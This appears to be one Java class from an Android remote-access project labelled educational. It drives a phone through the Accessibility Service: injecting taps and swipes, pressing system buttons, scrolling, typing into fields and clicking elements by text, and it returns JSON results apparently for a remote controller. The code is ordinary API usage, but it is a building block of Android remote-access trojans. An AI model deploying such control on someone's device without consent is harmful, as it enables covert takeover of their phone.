package com.remoteaccess.educational.commands;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import android.view.Display;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.annotation.RequiresApi;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Screen Controller — Remote Screen Control via Accessibility Service
 *
 * All gesture methods require Android 7.0+ (API 24) and the accessibility
 * service config must declare  android:canPerformGestures="true".
 *
 * Scroll commands use swipe gestures rather than ACTION_SCROLL on the root
 * node, because the root is almost never itself scrollable.
 */
@RequiresApi(api = Build.VERSION_CODES.N)
public class ScreenController {

    private final AccessibilityService service;
    private final int screenW;
    private final int screenH;

    public ScreenController(AccessibilityService service) {
        this.service = service;

        WindowManager wm = (WindowManager) service.getSystemService(Context.WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();
        Point size = new Point();
        display.getRealSize(size);
        this.screenW = size.x;
        this.screenH = size.y;
    }

    // ── Internal helpers ──────────────────────────────────────────────────

    /** Build and dispatch a single-stroke gesture. Returns success flag. */
    private boolean dispatchPath(Path path, long duration) {
        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(new GestureDescription.StrokeDescription(path, 0, duration))
            .build();
        return service.dispatchGesture(gesture, null, null);
    }

    private JSONObject ok(String key, Object value) {
        JSONObject r = new JSONObject();
        try { r.put("success", true); r.put(key, value); } catch (JSONException ignored) {}
        return r;
    }

    private JSONObject err(String msg) {
        JSONObject r = new JSONObject();
        try { r.put("success", false); r.put("error", msg); } catch (JSONException ignored) {}
        return r;
    }

    // ── Touch / Swipe ─────────────────────────────────────────────────────

    /**
     * Tap at (x, y) for the given duration in milliseconds.
     * duration should be >= 50 ms; 100 ms is a normal tap.
     */
    public JSONObject touch(int x, int y, int duration) {
        if (x < 0 || x > screenW || y < 0 || y > screenH)
            return err("Coordinates out of bounds (" + x + "," + y + ") for screen " + screenW + "×" + screenH);

        int safeDur = Math.max(50, duration);
        Path path = new Path();
        path.moveTo(x, y);
        boolean ok = dispatchPath(path, safeDur);
        JSONObject r = new JSONObject();
        try {
            r.put("success", ok);
            r.put("x", x); r.put("y", y); r.put("duration", safeDur);
            if (!ok) r.put("error", "dispatchGesture returned false — is canPerformGestures=true in accessibility config?");
        } catch (JSONException ignored) {}
        return r;
    }

    /**
     * Swipe from (startX,startY) to (endX,endY) over the given duration.
     */
    public JSONObject swipe(int startX, int startY, int endX, int endY, int duration) {
        int safeDur = Math.max(100, duration);
        Path path = new Path();
        path.moveTo(startX, startY);
        path.lineTo(endX, endY);
        boolean ok = dispatchPath(path, safeDur);
        JSONObject r = new JSONObject();
        try {
            r.put("success", ok);
            r.put("startX", startX); r.put("startY", startY);
            r.put("endX", endX); r.put("endY", endY);
            if (!ok) r.put("error", "Gesture dispatch failed");
        } catch (JSONException ignored) {}
        return r;
    }

    // ── Global actions ────────────────────────────────────────────────────

    public JSONObject pressBack() {
        boolean ok = service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
        return buildGlobalResult("back", ok);
    }

    public JSONObject pressHome() {
        boolean ok = service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
        return buildGlobalResult("home", ok);
    }

    public JSONObject pressRecents() {
        boolean ok = service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
        return buildGlobalResult("recents", ok);
    }

    public JSONObject openNotifications() {
        boolean ok = service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
        return buildGlobalResult("notifications", ok);
    }

    public JSONObject openQuickSettings() {
        boolean ok = service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS);
        return buildGlobalResult("quick_settings", ok);
    }

    private JSONObject buildGlobalResult(String action, boolean success) {
        JSONObject r = new JSONObject();
        try { r.put("success", success); r.put("action", action); } catch (JSONException ignored) {}
        return r;
    }

    // ── Scroll via swipe gesture (much more reliable than ACTION_SCROLL) ──

    /**
     * Scroll up — swipes from bottom-third to top-third of the screen.
     * This reliably scrolls any scrollable view regardless of which node
     * is scrollable.
     */
    public JSONObject scrollUp() {
        int cx = screenW / 2;
        int fromY = (int) (screenH * 0.25);   // start near top
        int toY   = (int) (screenH * 0.75);   // end near bottom (finger moves DOWN to scroll UP)

        // First try ACTION_SCROLL_BACKWARD on the first scrollable node
        boolean nodeScroll = tryScrollNode(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD);
        if (nodeScroll) return buildGlobalResult("scroll_up", true);

        // Fallback: gesture swipe (drag finger downward = scroll content up)
        boolean ok = swipeGesture(cx, fromY, cx, toY, 400);
        return buildScrollResult("scroll_up", ok, "gesture");
    }

    /**
     * Scroll down — swipes from top-third to bottom-third of the screen.
     */
    public JSONObject scrollDown() {
        int cx = screenW / 2;
        int fromY = (int) (screenH * 0.75);   // start near bottom
        int toY   = (int) (screenH * 0.25);   // end near top (finger moves UP to scroll DOWN)

        boolean nodeScroll = tryScrollNode(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
        if (nodeScroll) return buildGlobalResult("scroll_down", true);

        boolean ok = swipeGesture(cx, fromY, cx, toY, 400);
        return buildScrollResult("scroll_down", ok, "gesture");
    }

    private boolean tryScrollNode(int scrollAction) {
        try {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return false;
            boolean scrolled = findAndScroll(root, scrollAction);
            root.recycle();
            return scrolled;
        } catch (Exception e) {
            return false;
        }
    }

    /** DFS to find first scrollable node and perform action on it. */
    private boolean findAndScroll(AccessibilityNodeInfo node, int action) {
        if (node == null) return false;
        if (node.isScrollable()) {
            boolean r = node.performAction(action);
            if (r) return true;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndScroll(child, action)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    private boolean swipeGesture(int fromX, int fromY, int toX, int toY, int duration) {
        Path path = new Path();
        path.moveTo(fromX, fromY);
        path.lineTo(toX, toY);
        return dispatchPath(path, duration);
    }

    private JSONObject buildScrollResult(String action, boolean success, String method) {
        JSONObject r = new JSONObject();
        try {
            r.put("success", success);
            r.put("action", action);
            r.put("method", method);
        } catch (JSONException ignored) {}
        return r;
    }

    // ── Text input ───────────────────────────────────────────────────────

    /**
     * Type text into the currently focused input field.
     * Requires the field to already be focused (tap it first if needed).
     */
    public JSONObject inputText(String text) {
        try {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return err("No active window");

            // Try focused input first, then any editable field
            AccessibilityNodeInfo target = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            if (target == null) target = findFirstEditable(root);

            if (target == null) {
                root.recycle();
                return err("No focused or editable input field found");
            }

            Bundle args = new Bundle();
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            boolean ok = target.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);

            target.recycle();
            root.recycle();

            JSONObject r = new JSONObject();
            r.put("success", ok);
            r.put("text", text);
            if (!ok) r.put("error", "ACTION_SET_TEXT failed — field may not support it");
            return r;
        } catch (Exception e) {
            return err(e.getMessage());
        }
    }

    private AccessibilityNodeInfo findFirstEditable(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isEditable()) return node;
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo found = findFirstEditable(child);
                if (found != null) {
                    child.recycle();
                    return found;
                }
                child.recycle();
            }
        }
        return null;
    }

    // ── Click by text ─────────────────────────────────────────────────────

    /**
     * Click the first UI element whose text or content-description contains
     * the search string (case-insensitive).
     */
    public JSONObject clickByText(String searchText) {
        try {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return err("No active window");

            java.util.List<AccessibilityNodeInfo> nodes =
                root.findAccessibilityNodeInfosByText(searchText);

            if (nodes == null || nodes.isEmpty()) {
                root.recycle();
                return err("No element found with text: " + searchText);
            }

            boolean clicked = false;
            Rect tmpBounds = new Rect();

            for (AccessibilityNodeInfo n : nodes) {
                // Use the node itself or walk up to find a clickable ancestor
                AccessibilityNodeInfo clickable = findClickableAncestor(n);
                if (clickable != null) {
                    clickable.getBoundsInScreen(tmpBounds);
                    // Use gesture tap on the center of the element for reliability
                    int cx = tmpBounds.centerX();
                    int cy = tmpBounds.centerY();
                    if (cx > 0 && cy > 0 && cx < screenW && cy < screenH) {
                        Path path = new Path();
                        path.moveTo(cx, cy);
                        clicked = dispatchPath(path, 100);
                    }
                    if (!clicked) {
                        clicked = clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                    if (clickable != n) clickable.recycle();
                }
                n.recycle();
                if (clicked) break;
            }

            root.recycle();

            JSONObject r = new JSONObject();
            r.put("success", clicked);
            r.put("text", searchText);
            if (!clicked) r.put("error", "Found element but click failed");
            return r;
        } catch (Exception e) {
            return err(e.getMessage());
        }
    }

    /** Walk up the tree to find the nearest clickable ancestor (or self). */
    private AccessibilityNodeInfo findClickableAncestor(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isClickable()) return node;
        AccessibilityNodeInfo parent = node.getParent();
        if (parent == null) return node; // return node itself as last resort
        AccessibilityNodeInfo result = findClickableAncestor(parent);
        if (result != parent) parent.recycle();
        return result;
    }

    // ── Screen dimensions ─────────────────────────────────────────────────

    public JSONObject getScreenInfo() {
        JSONObject r = new JSONObject();
        try { r.put("success", true); r.put("width", screenW); r.put("height", screenH); }
        catch (JSONException ignored) {}
        return r;
    }
}
